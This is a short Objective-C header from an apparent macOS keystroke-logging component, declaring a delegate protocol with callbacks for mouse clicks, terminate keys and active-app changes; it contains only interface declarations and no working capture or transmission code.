//
//  KeyboardLoggerManagerDelegate.h
//  KeyboardLoggerManager
//
//  Created by Makara Khloth on 2/6/15.
//  Copyright (c) 2015 Makara Khloth. All rights reserved.
//

#import <AppKit/AppKit.h>

@class KeyStrokeInfo;

@protocol KeyboardLoggerManagerDelegate <NSObject>
- (void) mouseClickDetected: (KeyStrokeInfo *) aKeyStrokeInfo mouseEvent: (NSEvent *) aEvent;
- (void) terminateKeyDetected: (KeyStrokeInfo *) aKeyStrokeInfo keySymbol: (NSString *) aSymbol;
- (void) activeAppChangeKeyDetected: (KeyStrokeInfo *) aKeyStrokeInfo inactiveBundleID: (NSString *) aBundleID;
@end
